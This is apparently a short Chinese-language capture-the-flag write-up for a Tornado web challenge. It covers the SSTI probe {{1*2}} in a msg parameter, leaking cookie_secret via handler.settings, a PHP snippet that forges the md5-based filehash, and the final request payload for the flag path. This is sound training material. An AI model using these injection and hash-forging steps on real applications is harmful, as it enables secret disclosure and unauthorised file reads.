@[toc]

##  前言

这个题就是不太算一个SSTI的题，就是对tornado框架的理解

##  解题思路

进网站后看到三个文件，分别打开

```
/flag.txt,flag in /fllllllllllllag
/welcome.txt,render
/hints.txt,md5(cookie_secret+md5(filname))
```

这个时候我们需要看到url有两个参数，filename和filehash。

网上搜tornado，发现是python的web框架，尝试用SSTI注入的方法

filename={{1*2}}

弹出error，我们又发现URL有参数msg，继续模板注入，注不进去。

回到hints.txt,发现filename有，只需找到cookie_secret.

在[tornado的handler.settings](https://xz.aliyun.com/t/2908)可以找到cookie_secret

最后就找md5的hash值

```php
<?php
$a=md5("/fllllllllllllag");
$b='180e88c0-6eba-4d44-84b5-3763dda49173'.$a;
echo md5($b);
```

payload:

```
filename=/fllllllllllllag&filehash=e8678b4a129b62d01f52a71c6e61257a
```







